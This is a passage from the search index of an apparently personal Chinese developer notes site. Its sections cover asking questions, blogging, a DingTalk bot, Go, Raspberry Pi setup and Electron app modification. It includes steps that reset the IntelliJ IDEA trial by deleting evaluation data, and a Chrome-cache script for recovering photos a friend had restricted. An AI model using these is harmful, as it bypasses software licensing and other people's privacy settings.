\u8bf7\u95ee\u8fd8\u6709\u4ec0\u4e48\u662f\u6211\u9057\u6f0f\u7684?","title":"\u7b80\u77ed\u7248"},{"location":"Developer/#_4","text":"\u7a0b\u5e8f\u5458\u4eec\u53ea\u504f\u7231\u8270\u5de8\u7684\u4efb\u52a1\uff0c\u6216\u8005\u80fd\u6fc0\u53d1\u4ed6\u4eec\u601d\u7ef4\u7684\u597d\u95ee\u9898 \u5bf9\u65b9\u6ca1\u6709\u4e49\u52a1\u5fcd\u8010\u4f60\u7684\u65e0\u77e5\u548c\u61d2\u60f0 \u5468\u5168\u7684\u601d\u8003\uff0c\u51c6\u5907\u597d\u4f60\u7684\u95ee\u9898\uff0c\u8349\u7387\u7684\u53d1\u95ee\u53ea\u80fd\u5f97\u5230\u8349\u7387\u7684\u56de\u7b54\uff0c\u6216\u8005\u6839\u672c\u5f97\u4e0d\u5230\u4efb\u4f55\u7b54\u6848","title":"\u9996\u5148\u4f60\u9700\u8981\u660e\u767d"},{"location":"Developer/#_5","text":"\u7528\u4e2d \u82f1\u6587 \u8fdb\u884c Google , \u7ffb\u524d\u4e24\u9875\u7684\u7ed3\u679c, \u5f80\u5f80Stack Overflow\u7f51\u7ad9\u4e0a\u7684\u7b54\u6848\u5c31\u662f\u6b63\u786e\u7b54\u6848. \u5982\u679c\u6ca1\u6709\u627e\u5230, \u66f4\u6362\u53ef\u80fd\u7684\u5173\u952e\u8bcd\u591a\u6b21\u5c1d\u8bd5 \u5728FAQ/\u6587\u6863\u91cc\u627e\u7b54\u6848, \u8010\u5fc3\u8bfb\u82f1\u6587\u6587\u6863\u662f\u57fa\u672c\u7d20\u517b","title":"\u63d0\u95ee\u4e4b\u524d"},{"location":"Developer/#_6","text":"\u4f7f\u7528\u8a00\u7b80\u610f\u8d45\uff0c\u63cf\u8ff0\u51c6\u786e\u7684\u6807\u9898 \u7cbe\u786e\u63cf\u8ff0, \u4fe1\u606f\u91cf\u5927, \u4f46\u662f\u4e0d\u5570\u55e6 \u5c3d\u53ef\u80fd\u8be6\u7ec6\u800c\u660e\u786e\u7684\u63cf\u8ff0\u75c7\u72b6 \u63d0\u4f9b\u95ee\u9898\u53d1\u751f\u7684\u73af\u5883\uff08\u673a\u5668\u914d\u7f6e\u3001\u64cd\u4f5c\u7cfb\u7edf\u3001\u5e94\u7528\u7a0b\u5e8f\u4ee5\u53ca\u522b\u7684\u4ec0\u4e48\uff09 \u8bf4\u660e\u4f60\u5728\u63d0\u95ee\u524d\u662f\u600e\u6837\u53bb\u7814\u7a76\u548c\u7406\u89e3\u8fd9\u4e2a\u95ee\u9898\u7684 \u8bf4\u660e\u4f60\u5728\u63d0\u95ee\u524d\u91c7\u53d6\u4e86\u4ec0\u4e48\u6b65\u9aa4\u53bb\u89e3\u51b3\u5b83 \u5728\u81ea\u5df1\u7684\u5c1d\u8bd5\u4e2d, \u6392\u9664\u4e86\u54ea\u4e9b\u53ef\u80fd\u7684\u539f\u56e0 \u7f57\u5217\u6700\u8fd1\u505a\u8fc7\u4ec0\u4e48\u53ef\u80fd\u6709\u5f71\u54cd\u7684\u786c\u4ef6\u3001\u8f6f\u4ef6\u53d8\u66f4 \u5c3d\u91cf\u60f3\u8c61\u4e00\u4e2a\u7a0b\u5e8f\u5458\u4f1a\u600e\u6837\u53cd\u95ee\u4f60\uff0c\u5728\u63d0\u95ee\u7684\u65f6\u5019\u9884\u5148\u7ed9\u4ed6\u7b54\u6848 \u5bf9\u6bcf\u4e00\u4e2a\u5173\u952e\u6b65\u9aa4\u622a\u56fe, \u5982\u679c\u6709\u9519\u8bef\u4fe1\u606f, **\u622a\u56fe\u548c\u6587\u5b57\u7248**\u8fde\u540c\u4ea7\u751f\u95ee\u9898\u7684**\u4ee3\u7801**\u90fd\u8981\u53d1\u7ed9\u5bf9\u65b9 \u7ed9\u51fa\u81ea\u5df1\u51fa\u95ee\u9898\u7684\u4ee3\u7801, \u5fc5\u987b\u662f\u5bf9\u65b9\u590d\u5236\u540e\u5c31\u80fd\u7acb\u5373\u8fd0\u884c, \u5e76\u4e14\u590d\u73b0\u95ee\u9898\u7684\u6700\u7b80\u4ee3\u7801. \u5220\u53bb\u4e0e\u95ee\u9898\u65e0\u5173\u7684\u90e8\u5206 \u522b\u95ee\u5e94\u8be5\u81ea\u5df1\u89e3\u51b3\u7684\u95ee\u9898, \u907f\u514d\u65e0\u610f\u4e49\u7684\u7591\u95ee","title":"\u53d1\u95ee\u7684\u5f62\u5f0f"},{"location":"Developer/#_7","text":"\u7b80\u77ed\u8bf4\u660e\u81ea\u5df1\u662f\u5982\u4f55\u89e3\u51b3\u7684, \u540e\u7eed\u5c1d\u8bd5\u7684\u8fc7\u7a0b \u5982\u679c\u522b\u4eba\u5bf9\u4f60\u6709\u5e2e\u52a9, \u611f\u8c22\u4e00\u4e0b\u5bf9\u65b9, \u6bd4\u5982\u53d1\u4e2a\u7ea2\u5305\u4ec0\u4e48\u7684","title":"\u95ee\u9898\u89e3\u51b3\u540e"},{"location":"Developer/#_8","text":"","title":"\u9644\u52a0"},{"location":"Developer/#_9","text":"\u7535\u8111\u51fa\u73b0\u6545\u969c\uff0c\u5982\u4f55\u6b63\u786e\u5730\u63d0\u95ee https://vjudge1.github.io/2015/07/01/how-to-ask.html \u4f60\u4f1a\u95ee\u95ee\u9898\u5417 http://coolshell.cn/articles/3713.html \u300a\u63d0\u95ee\u7684\u827a\u672f\uff1a\u5982\u4f55\u5feb\u901f\u83b7\u5f97\u7b54\u6848\u300b\uff08\u7cbe\u8bfb\u7248\uff09 http://bbs.csdn.net/topics/390307835","title":"\u53c2\u8003"},{"location":"Developer/#_10","text":"(\u65b9\u4fbf\u5728\u804a\u5929\u5de5\u5177\u91cc\u7529\u7ed9\u5bf9\u65b9):","title":"\u672c\u6587\u7684\u56fe\u7247\u7248"},{"location":"Developer/#chromeqq","text":"\u770b\u5230\u6709\u597d\u53cb\u79c0\u6069\u7231\uff0c\u7136\u540e\u5c31\u6ca1\u6709\u6743\u9650\u8bbf\u95ee\u4e86\uff0c\u4f46\u6253\u5f00\u8fc7\u7684\u56fe\u7247\u6709chrome\u7f13\u5b58\uff0c\u4e8e\u662f\u4fbf\u5c1d\u8bd5\u4ece\u7f13\u5b58\u627e\u5230\u56fe\u7247url chrome\u7684\u7f13\u5b58\u53ef\u4ee5\u5728\u8fd9\u91cc\u627e\u5230\uff1a chrome://cache/ \u7136\u540e\u968f\u610f\u70b9\u5f00\u4e00\u5f20qq\u7a7a\u95f4\u7684\u56fe\u7247\uff0c\u53d1\u73b0\u5176\u5305\u542bpsb\uff08\u6bd5\u7adf\u53f3\u952e\u4fdd\u5b58\u7684\u6587\u4ef6\u540d\u9ed8\u8ba4\u5c31\u662fpsb\uff09\uff0c\u7136\u540e\u5c31\u662f\u641c\u7d22\u54af \u5728\u70b9\u8fdb\u53bb\u7684\u7f13\u5b58\u9875\u9762\u53ef\u4ee5F12\u6267\u884cjs\uff0c\u67e5\u770b\u7f13\u5b58\u56fe\u7247\uff1a \u4ee3\u7801\u6765\u6e90\uff1ahttp://www.sensefulsolutions.com/2012/01/viewing-chrome-cache-easy-way.html ( function () { var preTags = document . getElementsByTagName ( 'pre' ); var preWithHeaderInfo = preTags [ 0 ]; var preWithContent = preTags [ 2 ]; var lines = preWithContent . textContent . split ( ' \\n ' ); // get data about the formatting ( changes between different versions of chrome ) var rgx = /^ ( 0 { 8 }: \\ s + )([ 0 - 9 a - f ]{ 2 } \\ s + )[ 0 - 9 a - f ]{ 2 } / m ; var match = rgx . exec ( lines [ 0 ]); var text = '' ; for ( var i = 0 ; i < lines . length ; i ++ ) { var line = lines [ i ]; var firstIndex = match [ 1 ] . length ; // first index of the chars to match ( e . g . where a '84' would start ) var indexJump = match [ 2 ] . length ; // how much space is between each set of numbers var totalCharsPerLine = 16 ; index = firstIndex ; for ( var j = 0 ; j < totalCharsPerLine ; j ++ ) { var hexValAsStr = line . substr ( index , 2 ); if ( hexValAsStr == ' ' ) { // no more chars break ; } var asciiVal = parseInt ( hexValAsStr , 16 ); text += String . fromCharCode ( asciiVal ); index += indexJump ; } } var headerText = preWithHeaderInfo . textContent ; var elToInsertBefore = document . body . childNodes [ 0 ]; var insertedDiv = document . createElement ( \"div\" ); document . body . insertBefore ( insertedDiv , elToInsertBefore ); // find the filename var nodes = [ document . body ]; var filepath = '' ; while ( true ) { var node = nodes . pop (); if ( node . hasChildNodes ()) { var children = node . childNodes ; for ( var i = children . length - 1 ; i >= 0 ; i -- ) { nodes . push ( children [ i ]); } } if ( node . nodeType === Node . TEXT_NODE && / \\ S /. test ( node . nodeValue )) { // 1 st depth - first text node ( with non - whitespace chars ) found filepath = node . nodeValue ; break ; } } outputResults ( insertedDiv , convertToBase64 ( text ), filepath , headerText ); insertedDiv . appendChild ( document . createElement ( 'hr' )); function outputResults ( parentElement , fileContents , fileUrl , headerText ) { // last updated 1 / 27 / 12 var rgx = /.+ \\ / ([ ^ \\ / ] + ) / ; var filename = rgx . exec ( fileUrl )[ 1 ]; // get the content type rgx = / content - type : ( .+ ) / i ; var match = rgx . exec ( headerText ); var contentTypeFound = match != null ; var contentType = \"text/plain\" ; if ( contentTypeFound ) { contentType = match [ 1 ]; } var dataUri = \"data:\" + contentType + \";base64,\" + fileContents ; // check for gzipped file var gZipRgx = / content - encoding : gzip / i ; if ( gZipRgx . test ( headerText )) { filename += '.gz' ; } // check for image var imageRgx = / image / i ; var isImage = imageRgx . test ( contentType ); // create link var aTag = document . createElement ( 'a' ); aTag . textContent = \"Left-click to download the cached file\" ; aTag . setAttribute ( 'href' , dataUri ); aTag . setAttribute ( 'download' , filename ); parentElement . appendChild ( aTag ); parentElement . appendChild ( document . createElement ( 'br' )); // create image if ( isImage ) { var imgTag = document . createElement ( 'img' ); imgTag . setAttribute ( \"src\" , dataUri ); parentElement . appendChild ( imgTag ); parentElement . appendChild ( document . createElement ( 'br' )); } // create warning if ( ! contentTypeFound ) { var pTag = document . createElement ( 'p' ); pTag . textContent = \"WARNING: the type of file was not found in the headers... defaulting to text file.\" ; parentElement . appendChild ( pTag ); } } function getBase64Char ( base64Value ) { if ( base64Value < 0 ) { throw \"Invalid number: \" + base64Value ; } else if ( base64Value <= 25 ) { // A - Z return String . fromCharCode ( base64Value + \"A\" . charCodeAt ( 0 )); } else if ( base64Value <= 51 ) { // a - z base64Value -= 26 ; // a return String . fromCharCode ( base64Value + \"a\" . charCodeAt ( 0 )); } else if ( base64Value <= 61 ) { // 0 - 9 base64Value -= 52 ; // 0 return String . fromCharCode ( base64Value + \"0\" . charCodeAt ( 0 )); } else if ( base64Value <= 62 ) { return '+' ; } else if ( base64Value <= 63 ) { return '/' ; } else { throw \"Invalid number: \" + base64Value ; } } function convertToBase64 ( input ) { // http : // en . wikipedia . org / wiki / Base64 #Example var remainingBits ; var result = \"\" ; var additionalCharsNeeded = 0 ; var charIndex = - 1 ; var charAsciiValue ; var advanceToNextChar = function () { charIndex ++ ; charAsciiValue = input . charCodeAt ( charIndex ); return charIndex < input . length ; }; while ( true ) { var base64Char ; // handle 1 st char if ( ! advanceToNextChar ()) break ; base64Char = charAsciiValue >>> 2 ; remainingBits = charAsciiValue & 3 ; // 0000 0011 result += getBase64Char ( base64Char ); // 1 st char additionalCharsNeeded = 3 ; // handle 2 nd char if ( ! advanceToNextChar ()) break ; base64Char = ( remainingBits << 4 ) | ( charAsciiValue >>> 4 ); remainingBits = charAsciiValue & 15 ; // 0000 1111 result += getBase64Char ( base64Char ); // 2 nd char additionalCharsNeeded = 2 ; // handle 3 rd char if ( ! advanceToNextChar ()) break ; base64Char = ( remainingBits << 2 ) | ( charAsciiValue >>> 6 ); result += getBase64Char ( base64Char ); // 3 rd char remainingBits = charAsciiValue & 63 ; // 0011 1111 result += getBase64Char ( remainingBits ); // 4 th char additionalCharsNeeded = 0 ; } // there may be an additional 2 - 3 chars that need to be added if ( additionalCharsNeeded == 2 ) { remainingBits = remainingBits << 2 ; // 4 extra bits result += getBase64Char ( remainingBits ) + \"=\" ; } else if ( additionalCharsNeeded == 3 ) { remainingBits = remainingBits << 4 ; // 2 extra bits result += getBase64Char ( remainingBits ) + \"==\" ; } else if ( additionalCharsNeeded != 0 ) { throw \"Unhandled number of additional chars needed: \" + additionalCharsNeeded ; } return result ; } })() \u4f8b\u5982\u627e\u5230http://a3.qpic.cn/psb?/V12C1bLj2DcCgb/f9hTWn5wbxt3dZd5MlUCHX6tA9oqVOudgT2rqARLltk!/a/dI4BAAAAAAAA \u4f46\u8fd9\u6837\u53ea\u662f\u4e00\u5f20\u5c0f\u56fe\uff0c\u6211\u4eec\u5f53\u7136\u5e0c\u671b\u6709\u5927\u56fe\uff0c\u6bd4\u5bf9\u5927\u56fe\u7684url\u53d1\u73b0\u53ea\u8981\u5c06\u4e0a\u8ff0url\u7684/a/\u66ff\u6362\u4e3a/b/\u5373\u53ef \u6240\u4ee5\u603b\u7ed3\u4e00\u4e0b\u5c31\u662f\u6253\u5f00\u7f13\u5b58\u9875\u9762chrome://cache/\uff0c\u67e5\u627epsb\u5b57\u7b26\u4e32\uff0c\u627e\u5230\u60f3\u8981\u7684\u56fe\u7247\uff0c\u5982\u679c\u662f\u5c0f\u56fe\u5c31\u6539\u4e00\u4e0burl\u5f97\u5230\u5927\u56fe","title":"\u4f7f\u7528chrome\u7f13\u5b58\u627e\u5230\u88ab\u5220\u7684qq\u7a7a\u95f4\u7684\u56fe\u7247"},{"location":"Developer/#_11","text":"\u6458\u81ea https://manishearth.github.io/blog/2018/08/26/why-i-enjoy-blogging/ \u5199\u4e0b\u6765\u7684\u8fc7\u7a0b\u53d1\u73b0\u81ea\u5df1\u8fd8\u6709\u4e0d\u61c2\u7684\uff0c\u7ed9\u81ea\u5df1\u8bb2\u6e05\u695a\u751a\u81f3\u80fd\u53d1\u73b0rust\u6807\u51c6\u5e93\u7684bug\uff0c\u672c\u8d28\u4e0a\u662f\u7ed9\u5f88\u591a\u4eba\u8bb2\u9700\u8981\u8003\u8651\u6240\u6709\u65b9\u9762\u800c\u4e0d\u662f\u6700\u5c0f\u5fc5\u8981\uff1b\u5f53\u4f60\u89c9\u5f97\u663e\u800c\u6613\u89c1\u7684\u65f6\u5019\u5f88\u5bb9\u6613\u5931\u53bb\u89e3\u91ca\u6e05\u695a\u7684\u80fd\u529b \u8bfb\u65e7\u7684\u6587\u7ae0\u5f88\u6709\u8da3 \u8ba9\u81ea\u5df1\u56de\u5230\u5199\u4f5c\u7684\u90a3\u4e00\u65f6\u523b \u6bd4\u8f83\u5f53\u65f6\u81ea\u5df1\u7684\u7406\u89e3\u548c\u73b0\u5728\u7684 \u4f53\u4f1a\u81ea\u5df1\u7684\u8fdb\u6b65\uff0c\u91cd\u65b0\u5b66\u4e60\u5df2\u7ecf\u5fd8\u4e86\u7684 \u5199\u4f5c\u80fd\u6362\u4e2a\u8111\u5b50 \u5728\u4e0d\u540c\u5de5\u4f5c\u4e4b\u524d\u5207\u6362 \u4f7f\u7528\u4e0d\u540c\u7684\u8111\u533a \u6574\u5929\u90fd\u6709\u7cbe\u529b \u5199blog\u80fd\u5077\u61d2 \u4ee5\u540e\u6709\u4eba\u95ee\u5230\u5c31\u80fd\u76f4\u63a5\u7ed9\u94fe\u63a5\u8bf4\u201c\u4f60\u60f3\u77e5\u9053\u66f4\u591a\u7684\u8bdd \u6211\u5df2\u7ecf\u5728\u8fd9\u5199\u8fc7\u4e86\u201d \u522b\u4eba\u5199\u8fc7\u4e86\u8fd8\u8981\u4e0d\u8981\u5199\uff1f\u8981\u5199\uff01 \u4f60\u7684\u7406\u89e3\u4e0d\u540c\uff0c\u6563\u843d\u5728\u4e0d\u540c\u5730\u65b9\u7684\u77e5\u8bc6\u7efc\u5408\u8d77\u6765\u4e5f\u6709\u4ef7\u503c \u4f60\u771f\u6b63\u7684\u804c\u8d23\u662f\u5f53\u4f60\u6709\u7a7afree\u4e86\uff0c\u4f60\u5e94\u8be5\u8ba9\u5176\u4ed6\u4eba\u4e5f\u8f7b\u677efree\uff0c\u5982\u679c\u4f60\u6709\u80fd\u529bpower\uff0c\u4f60\u7684\u804c\u8d23\u5c31\u662f\u4e3a\u5176\u4ed6\u4eba\u8d4b\u80fdempower \u81ea\u5b66\u4e0d\u610f\u5473\u7740\u5f53\u4e00\u4e2a\u7f16\u8bd1\u5668\u7684fuzzer\u968f\u673a\u5c1d\u8bd5\uff0c\u800c\u662f\u5b66\u6587\u6863tutorial\uff0c\u4ece\u4e66\u7c4d\u5b66\u7b97\u6cd5\u2014\u2014\u81ea\u5b66\u53ea\u662f\u8bf4\u4f60\u5b8c\u5168\u638c\u63a7\u81ea\u5df1\u7684\u5b66\u4e60\u8fc7\u7a0b\uff0c\u4f46\u4ecd\u7136\u4f9d\u8d56\u5176\u4ed6\u4eba\u7684\u5de5\u4f5c \u4f60\u4e5f\u5e94\u8be5\u5199\u535a\u5ba2 \u8fd9\u91cc\u6709\u4e00\u4e9b\u5efa\u8baehttps://jvns.ca/blog/2016/05/22/how-do-you-write-blog-posts/","title":"\u4e3a\u4ec0\u4e48\u6211\u559c\u6b22\u5199\u535a\u5ba2\uff1f"},{"location":"Developer/#atoutgoing","text":"\u9700\u8981\u81ea\u5df1\u6ce8\u518c\u4e00\u4e2a\u4f01\u4e1a\uff0c\u7ba1\u7406\u5458\u624d\u80fd\u521b\u5efa\u8fd9\u79cd\u673a\u5668\u4eba\uff0c\u673a\u5668\u4eba\u53ea\u80fd\u5728\u5185\u90e8\u7fa4\u4f7f\u7528 \u6587\u6863\uff1a https://ding-doc.dingtalk.com/doc#/serverapi2/elzz1p \u5176\u4e2d\u7f3a\u5931\u4e86\u5173\u4e8eatDingtalkIds\u7684\u63cf\u8ff0\uff0c\u9700\u8981\u770b\u8fd9\u4e2a\uff1a https://juejin.im/post/6844903922029576205 \u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\u6709\uff1a\u4fee\u6539\u670d\u52a1\u5668\u56de\u8c03\u901a\u77e5\u5730\u5740\u548c\u4fee\u6539\u4e0a\u7ebf\u7684\u65f6\u5019\uff0c\u9489\u9489\u5c31\u4f1a\u9a8c\u8bc1\u670d\u52a1\u5668\u662f\u5426\u6b63\u5e38\uff0c\u4f60\u53ef\u4ee5 while true; nc -lp 8888 < tmp.txt; done \u6b7b\u5faa\u73af\u63d0\u4f9b\u4e2a\u6b63\u5e38\u7684http\u670d\u52a1 POST\u53d1\u6765\u7684\u6570\u636e\u91cc\u9762\u6709\u4e34\u65f6\u7684url\u53ef\u4ee5\u53d1\u6d88\u606f\uff0c\u8fd8\u6709senderId\u662f\u53d1\u9001\u8005id\u7528\u6765\u5728atDingtalkIds\u4e2d\u4f7f\u7528 \u6536\u5230\u7684POST\u5185\u5bb9\uff1a {\"conversationId\":\"cidoAgtPbnu9MyulIyt0kpNYg==\",\"atUsers\":[{\"dingtalkId\":\"$:LWCP_v1:$Jh2MBlTKQnC/tN4tDTZB3eOIi+xOatMW\"}],\"chatbotCorpId\":\"dingb1d0b0ca51cxxxxxx\",\"chatbotUserId\":\"$:LWCP_v1:$Jh2MBlTKQnC/tN4tDTZB3eOIi+xOatMW\",\"msgId\":\"msgWjYj1k8LPNOBBy+jxNKwQw==\",\"senderNick\":\"\u53d1\u9001\u8005\u59d3\u540d\",\"isAdmin\":false,\"senderStaffId\":\"2665036700000000\",\"sessionWebhookExpiredTime\":1600622026555,\"createAt\":1600616626487,\"senderCorpId\":\"dingb1d0b0ca51c029b24ac5d6980000000\",\"conversationType\":\"2\",\"senderId\":\"$:LWCP_v1:$9gY0EpfG9gA0e4xnPjDHugeGB0JtdCJV\",\"conversationTitle\":\"\u7fa4\u7ec4\u6807\u9898\",\"isInAtList\":true,\"sessionWebhook\":\"https://oapi.dingtalk.com/robot/sendBySession?session=b28f49899ea1cba0d256673d66ffe386\",\"text\":{\"content\":\" 1+1\"},\"msgtype\":\"text\"} \u56de\u590d\u53d1\u9001\u8005\u4e00\u4e2a666\uff1a curl https://oapi.dingtalk.com/robot/sendBySession?session=b28f49899ea1cba0d256673d66ffe386 -H \"Content-Type: application/json\" --data '{\"msgtype\":\"text\", \"text\":{\"content\":\"666\"}, \"at\":{\"atDingtalkIds\":[\"$:LWCP_v1:$9gY0EpfG9gA0e4xnPjDHugeGB0JtdCJV\"]}}'","title":"\u652f\u6301\u88abat\u7684(outgoing)\u9489\u9489\u673a\u5668\u4eba"},{"location":"Developer/#go","text":"","title":"Go\u8bed\u8a00"},{"location":"Developer/#_12","text":"wget - q https : // golang . org / dl / go1 . 15.3 . linux - amd64 . tar . gz && \\ tar - C / usr / local - xzf go1 . 15.3 . linux - amd64 . tar . gz export PATH =$ PATH : / usr / local / go / bin","title":"\u5b89\u88c5"},{"location":"Developer/#build","text":"go build |& grep cannot |cut -d'\"' -f2|xargs go get","title":"\u63d0\u53d6build\u5931\u8d25\u7f3a\u5931\u7684\u5e93\u5b89\u88c5"},{"location":"Developer/#idea20202-30","text":"\u53c2\u8003\uff1a http://scz.617.cn:8/windows/202010261152.txt regedit\u627e\u5230HKCU\\SOFTWARE\\JavaSoft\\Prefs\\jetbrains\\idea\uff0c\u5176\u4e2d\u4f1a\u6709\u76ee\u5f55\u5305\u542bevlsprt3\\202\uff0c\u5220\u6389\u8fd9\u4e2a\u76ee\u5f55\u91cc\u9762\u7684evlsprt\u548cevlsprt2 \u7136\u540e\u5220\u9664\u8fd9\u4e9b\u76ee\u5f55\uff1a rd /s /q \"%APPDATA%\\JetBrains\\IntelliJIdea2020.2\\eval\" del \"%APPDATA%\\JetBrains\\PermanentDeviceId\" del \"%APPDATA%\\JetBrains\\PermanentUserId\" del \"%APPDATA%\\JetBrains\\bl\" del \"%APPDATA%\\JetBrains\\crl\" \u7f16\u8f91\u201d%APPDATA%\\JetBrains\\IntelliJIdea2020.2\\options\\other.xml\u201d \u5220\u9664\u5305\u542bevlsprt.202\u6216evlsprt2.202\u7684\u884c","title":"IDEA2020.2 30\u5929\u540e\u91cd\u65b0\u8bd5\u7528"},{"location":"Developer/#_13","text":"\u4e00\u6b3e\u65b0\u7684\u6811\u8393\u6d3e4\u5230\u624b\uff0c\u9ed8\u8ba4\u4e3a\u82f1\u56fd\u952e\u76d8\u5e03\u5c40\u4e0d\u80fd\u8f93\u5165@#\u7b26\u53f7\uff0c\u663e\u793a\u5206\u8fa8\u7387\u4e0d\u591f1080p\uff0c\u4ee5\u53ca\u6709\u7ebf\u7f51\u7edc\u548c\u65e0\u7ebf\u7f51\u7edc\u4f18\u5148\u7ea7\u9700\u8981\u8c03\u6574","title":"\u6811\u8393\u6d3e\u5230\u624b\u540e\u914d\u7f6e"},{"location":"Developer/#_14","text":"\u67e5\u5230\u6709\u6559\u7a0b\u8bf4 sudo raspi-config \u91cc\u53ef\u4ee5\u4fee\u6539\u952e\u76d8\u5e03\u5c40\uff0c\u5b9e\u6d4b\u53d1\u73b0\u6539\u4e86\u4e4b\u540e\u53ea\u6572\u4e86\u4e00\u6b21@\u4e4b\u540e\u53c8\u88ab\u6539\u56de\u53bb\u4e86\uff0c\u8fd8\u662f\u5f97\u4fee\u6539\u8f93\u5165\u6cd5\uff1a \u53c2\u8003 https://jingyan.baidu.com/article/3aed632e29dfd87011809169.html sudo apt install fcitx reboot \u53f3\u4e0a\u89d2\u6709\u8f93\u5165\u6cd5\u56fe\u6807 \u7ba1\u7406\u952e\u76d8 \u5220\u6389\u82f1\u56fd \u52a0\u4e0a\u82f1\u8bed(\u7f8e\u56fd)\u5373\u53ef","title":"\u4fee\u6539\u952e\u76d8\u5e03\u5c40"},{"location":"Developer/#_15","text":"\u53c2\u8003 https://www.ncnynl.com/archives/201607/226.html \u6811\u8393\u6d3e\u6709\u4e24\u79cdhdmi\u8f93\u51fa\u6a21\u5f0f\uff0c1\u662fCEA\u7535\u89c6\uff0c2\u662fDMT\u7535\u8111\u663e\u793a\u5668 \u67e5\u770b\u5f53\u524d\u663e\u793a\u5668\u652f\u6301\u7684\u5206\u8fa8\u7387\u4eec\uff1a tvservice -m CEA tvservice -m DMT \u5b9e\u9645\u4e0a\u663e\u793a\u51fa\u6765\u7684\u5e76\u4e0d\u4e00\u5b9a\u5b8c\u6574\uff0c\u8fd8\u9700\u8981\u81ea\u5df1\u591a\u6d4b\u8bd5\uff1a\u4f8b\u5982\u8bbe\u7f6e\u4e3a 640x480 60Hz tvservice -e \"DMT 4\" \u5efa\u8bae\u5728\u7ec8\u7aef\u91cc\u5148\u6572\u8fd9\u4e2a\u547d\u4ee4 \u5f53\u663e\u793a\u4e0d\u51fa\u6765\u7684\u65f6\u5019\u53ef\u4ee5\u6309\u2191\u56de\u8f66\u6539\u56de\u4e00\u4e2a\u6b63\u5e38\u663e\u793a\uff0c\u4e0d\u81f3\u4e8e\u91cd\u542f \u5b8c\u6574\u7684\u5217\u8868\u5728\u4e0a\u8ff0\u53c2\u8003\u94fe\u63a5\u4e2d\u6709\u4e86\uff0c\u53ef\u4ee5\u81ea\u5df1\u591a\u8bd5\u8bd5\uff0c\u5207\u6362\u5206\u8fa8\u7387\u540e\u8bb0\u5f97\u79fb\u52a8\u9f20\u6807 \u4e0d\u7136\u4e0d\u4f1a\u663e\u793a \u4f46\u662f\u6211\u5e0c\u671b\u7684\u5206\u8fa8\u7387 1920x1080 60Hz\u4e0d\u5728DMT\u5217\u8868\u4e2d\uff0c\u8fd9\u5c31\u9700\u8981\u81ea\u5b9a\u4e49\u5206\u8fa8\u7387\u4e86 \u4fee\u6539 /boot/config.txt \uff0c\u6dfb\u52a0\uff1a hdmi_cvt=1920 1080 60 3 hdmi_group=2 hdmi_mode=87 hdmi_drive=2 \u5176\u4e2dhdmi_cvt\u7684\u89e3\u91ca\uff1a https://www.raspberrypi.org/documentation/configuration/config-txt/video.md \u5176\u4e2d\u6700\u540e\u4e00\u4e2a3\u662fsdtv_aspect \u957f\u5bbd\u6bd4 \u6211\u8fd9\u91cc\u662f16:9 \u6240\u4ee5\u586b\u4e863 \u4fee\u6539\u540e\u91cd\u542f\u5373\u53ef\uff0c\u4f3c\u4e4e\u76ee\u524d\u6811\u8393\u6d3e\u4e5f\u5b66\u806a\u660e\u4e86\uff0c\u5373\u4f7fconfig.txt\u91cc\u914d\u7f6e\u4e86\u9519\u8bef\u7684\u503c\u663e\u793a\u4e0d\u51fa\u6765\uff0c\u4e5f\u4f1a\u81ea\u52a8\u56de\u9000\u5230720p\u4fdd\u8bc1\u663e\u793a","title":"\u663e\u793a\u5206\u8fa8\u7387\u4fee\u6539"},{"location":"Developer/#_16","text":"\u6211\u5e0c\u671b\u5916\u7f51\u8bbf\u95ee(default\u8def\u7531)\u8d70wifi\uff0c\u5185\u7f51\u8bbf\u95ee(10.0.0.0/8)\u8d70\u6709\u7ebf\uff0c\u4f46\u9ed8\u8ba4\u8054\u7f51\u540e\u6709\u7ebf\u4e5f\u4f1a\u5360\u636edefault\u8def\u7531\u800c\u4e14\u4f18\u5148\u7ea7\u6bd4\u65e0\u7ebf\u9ad8\uff08\u8dc3\u70b9\u6570\u5c0f\uff09 \u4e24\u4e2a\u7f51\u7edc\u90fd\u662f\u4f7f\u7528dhcp\u83b7\u53d6IP\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728dhcp\u7684\u914d\u7f6e\u6587\u4ef6\u91cc\u914d\u7f6emetric \u53c2\u8003\uff1a https://raspberrypi.stackexchange.com/a/50951 \u7f16\u8f91 /etc/dhcpcd.conf interface wlan0 metric 200 interface eth0 metric 300 \u7136\u540e\u7f16\u8f91dhcp\u7684hook\u81ea\u52a8\u6267\u884croute\u547d\u4ee4\uff1a \u53c2\u8003 https://wiki.archlinux.org/index.php/dhcpcd#DHCP_static_route.28s.29 \u7f16\u8f91 /etc/dhcpcd.exit-hook route add -net 10.0.0.0/8 gw <\u7f51\u5173ip> dev eth0","title":"\u8c03\u6574\u65e0\u7ebf\u7f51\u7edc\u548c\u6709\u7ebf\u7f51\u7edc\u7684\u4f18\u5148\u7ea7"},{"location":"Developer/#electron","text":"\u60f3\u8ba9\u8fd9\u4e2aElectron\u5e94\u7528\u6d4f\u89c8\u5668\u6253\u5f00\u81ea\u5b9a\u4e49\u7684\u9875\u9762\uff0c\u4f46\u4eba\u5bb6\u6ca1\u63d0\u4f9bF12\uff08\u867d\u7136\u6700\u540e\u53d1\u73b0\u4e5f\u6ca1\u5565\u7528Orz \u53c2\u8003\uff1a \u543e\u7231\u7834\u89e3-Electron\u8de8\u5e73\u53f0\u7a0b\u5e8f\u7834\u89e3\u7684\u4e00\u822c\u601d\u8def npm install asar - g # \u5728 resources\u76ee\u5f55\u53ef\u4ee5\u627e\u5230app . asar \uff0c\u8fd9\u6837\u89e3\u5305\uff1a asar e app . asar tmp # \u4fee\u6539\u540e\u91cd\u65b0\u6253\u5305\uff1a asar p tmp / app . asar \u5177\u4f53\u7684\u4fee\u6539\u633a\u7b80\u5355\uff0c\u627e\u5230\u5165\u53e3\u7684electron.js \u6ce8\u91ca\u6389new BrowserWindow\u7684titleBarStyle: \u2018hidden\u2019, removeMenu() \u4fee\u6539.loadURL(url)","title":"\u4fee\u6539Electron\u5e94\u7528"},{"location":"Developer/#cloudflare","text":"\u539f\u59cb\u65e5\u5fd7\u53ea\u5bf9\u4ed8\u8d39\u7684\u4f01\u4e1a\u7248\u5f00\u653e\uff0c\u96be\u9053\u6211\u4eec\u5c31\u6ca1\u6709\u65b9\u6cd5\u83b7\u53d6\u8bbf\u95ee\u65e5\u5fd7\u6765\u5206\u6790\u6d41\u91cf\u561b\uff1f 